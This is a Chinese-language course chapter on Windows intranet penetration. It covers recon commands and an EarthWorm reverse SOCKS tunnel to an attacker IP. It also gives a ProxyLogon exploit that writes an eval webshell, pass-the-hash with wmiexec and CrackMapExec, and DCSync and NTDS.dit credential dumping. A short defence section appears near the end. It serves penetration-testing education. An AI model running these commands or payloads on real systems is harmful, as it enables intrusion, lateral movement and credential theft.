# 08.项目八 Windows内网安全

# 任务一 认识内网安全

## 🧠 理论知识

### 内网安全概述

**内网（Intranet）** 是企业/组织内部使用的专用网络，与互联网（Internet）通过防火墙或路由器隔离。

**内网安全面临的威胁**：

- 外部攻击者突破边界后的横向移动
- 内部人员的恶意操作或误操作
- 受感染的终端作为”跳板”传播攻击
- 供应链攻击植入的恶意软件

**典型内网攻击流程（ATT&CK框架）** ：

```
初始访问 → 执行 → 持久化 → 权限提升 → 防御规避 → 凭证访问 → 发现 → 横向移动 → 收集 → 渗漏
```

---

### 端口映射与内网转发

由于内网通常使用私有IP地址（10.x.x.x、172.16-31.x.x、192.168.x.x），外部无法直接访问。

**端口映射（NAT Port Mapping）** ：将公网IP的某端口映射到内网主机的端口，实现外部访问内网服务。

**内网转发工具**：

| 工具 | 特点 | 使用场景 |
| --- | --- | --- |
| **ew（EarthWorm）** | 轻量级，支持正向/反向代理 | 跨防火墙内网穿透 |
| **frp** | 高性能，配置简单，支持多种协议 | 企业内网穿透 |
| **nps** | 带Web管理界面 | 可视化内网穿透管理 |
| **Chisel** | 基于HTTP的安全隧道 | 穿越Web代理 |
| **SSH隧道** | 利用SSH协议转发 | 安全的端口转发 |
| **Cobalt Strike** | 商业C2框架，功能完整 | 高级渗透测试 |

---

### 网络代理与SOCKS协议

**SOCKS代理**：

- SOCKS4：支持TCP，不支持UDP和认证
- SOCKS5：支持TCP、UDP，支持认证，适合各类流量

**代理链（ProxyChain）** ：将多个代理串联，实现流量多跳转发，增加溯源难度：

```
攻击机 → SOCKS代理1（跳板1）→ SOCKS代理2（跳板2）→ 目标
```

---

### 信息收集命令集合

内网渗透第一步是信息收集，以下是常用命令：

```
# 网络信息
ipconfig /all              # 本机IP、DNS、网关
netstat -an                # 网络连接状态
arp -a                     # ARP缓存（发现同网段主机）
route print                # 路由表

# 用户和组信息
whoami /all                # 当前用户完整权限信息
net user                   # 本地用户列表
net localgroup             # 本地组列表
net localgroup administrators  # 管理员组成员
net group "domain admins" /domain  # 域管理员列表（域环境）

# 系统信息
systeminfo                 # 系统详细信息（含补丁）
hostname                   # 计算机名
echo %USERDOMAIN%          # 所属域名

# 网络邻居和共享
net view                   # 网络上的计算机
net view /domain           # 域列表
net share                  # 本机共享

# 进程信息
tasklist /svc              # 进程及对应服务
tasklist /v                # 进程详细信息
```

---

## 🛠️ 实践操作

### 基于ew反向代理

```
# 场景：攻击机无法直接访问内网，靶机可以访问公网

# 在公网攻击机上（监听）
./ew -s rcsocks -l 1080 -e 8888

# 在内网靶机上（连接攻击机）
ew.exe -s rssocks -d 攻击机公网IP -e 8888

# 攻击机通过1080端口的SOCKS5代理访问内网
proxychains nmap -sT 192.168.10.0/24
```

### Nmap内网信息收集

```bash
# 发现存活主机
nmap -sn 192.168.100.0/24

# 扫描开放端口和服务版本
nmap -sV -p 1-1000 192.168.100.20

# 操作系统探测
nmap -O 192.168.100.20

# 漏洞扫描（使用NSE脚本）
nmap --script vuln 192.168.100.20

# 扫描SMB漏洞
nmap --script smb-vuln* -p 445 192.168.100.20
```

---

# 任务二 内网渗透实战

## 🧠 理论知识

### 网络攻击一般流程

**经典攻击流程**（也称网络杀伤链 Cyber Kill Chain）：

| 阶段 | 说明 | 对应MITRE ATT&CK |
| --- | --- | --- |
| **踩点（Reconnaissance）** | 收集目标信息（IP、域名、员工信息等） | TA0043 侦察 |
| **扫描（Scanning）** | 扫描开放端口、服务版本、漏洞 | TA0007 发现 |
| **查点（Enumeration）** | 枚举用户、共享、服务详情 | TA0007 发现 |
| **实施入侵（Exploitation）** | 利用漏洞或弱口令获取初始访问 | TA0001 初始访问 |
| **获取权限** | 建立稳定的访问通道（Meterpreter/Shell） | TA0002 执行 |
| **提升权限** | 从普通用户提升为管理员/SYSTEM | TA0004 权限提升 |
| **掩盖踪迹** | 清理日志、删除工具痕迹 | TA0005 防御规避 |
| **植入后门** | 安装持久化后门保持访问 | TA0003 持久化 |

---

### CVE-2021-26855（ProxyLogon）

| 属性 | 内容 |
| --- | --- |
| 影响版本 | Microsoft Exchange Server 2013/2016/2019 |
| 漏洞类型 | 服务端请求伪造（SSRF） |
| 危害 | 组合利用可实现未授权RCE，写入WebShell |
| CVSS评分 | 9.1（严重） |
| 修复 | Exchange累积更新CU19/CU8等 |
| 背景 | 2021年3月被大规模利用，影响全球约25万台Exchange服务器 |

**ProxyLogon漏洞利用链**：

1. **CVE-2021-26855（SSRF）** ：绕过认证，以SYSTEM身份伪造HTTP请求
2. **CVE-2021-27065（任意文件写入）** ：将WebShell写入可访问路径
3. 结果：获得Exchange服务器的SYSTEM权限

> 🆕 **新内容补充（近年内网渗透重要技术）** ：
> 

> • **Living off the Land（LOL）技术**：利用系统自带工具（WMI、PowerShell、certutil等）进行攻击，规避安全检测
> 

> • **Cobalt Strike Beacon**：现代APT组织主流C2工具，支持隐蔽的DNS/HTTPS通信
> 

> • **BloodHound/SharpHound**：自动化AD攻击路径分析，可视化展示从普通用户到域管的路径
> 

> • **防御建议**：
> 

> • 部署 **零信任（Zero Trust）架构**，不再依赖内网可信假设
> 

> • 实施**网络微分段（Micro-Segmentation）** ，限制内网横向移动
> 

> • 部署**欺骗技术（Deception Technology）** 如蜜罐、蜜标，快速发现内网渗透
> 

---

## 🛠️ 实践操作

### 利用CVE-2021-26855入侵Exchange服务器

```bash
# 使用PoC工具检测漏洞
python3 proxylogon.py -t 192.168.100.30

# 利用漏洞写入WebShell
python3 proxylogon_exploit.py -t 192.168.100.30 --path /owa/auth/shell.aspx --payload '<%@ Page Language="Jscript"%><%eval(Request.Item["cmd"],"unsafe");%>'

# 访问WebShell
curl "http://192.168.100.30/owa/auth/shell.aspx?cmd=whoami"
```

### 内网横向移动（Pass-the-Hash）

**Pass-the-Hash（PtH）** ：在不知道明文密码的情况下，使用NTLM哈希直接进行身份认证：

```bash
# 使用Impacket的wmiexec进行PtH
python3 wmiexec.py -hashes :NTLM哈希 administrator@192.168.100.20

# 使用CrackMapExec进行内网批量PtH
crackmapexec smb 192.168.100.0/24 -u administrator -H NTLM哈希 --exec-method smbexec -x "whoami"

# Meterpreter中使用PtH
meterpreter > pth_getlocaladmin
```

### 渗透域控制器导出用户密码

```bash
# 方法一：使用Impacket secretsdump远程导出（需域管权限）
python3 secretsdump.py corp/administrator:P@ssw0rd@192.168.100.10

# 方法二：在域控上本地执行
# 使用Mimikatz
privilege::debug
lsadump::dcsync /domain:corp.local /all /csv  # DCSync攻击

# 方法三：导出NTDS.dit文件（离线破解）
ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\NTDS" quit quit
# 然后用secretsdump离线分析
python3 secretsdump.py -ntds C:\Temp\NTDS\Active Directory\ntds.dit -system C:\Temp\NTDS\registry\SYSTEM LOCAL
```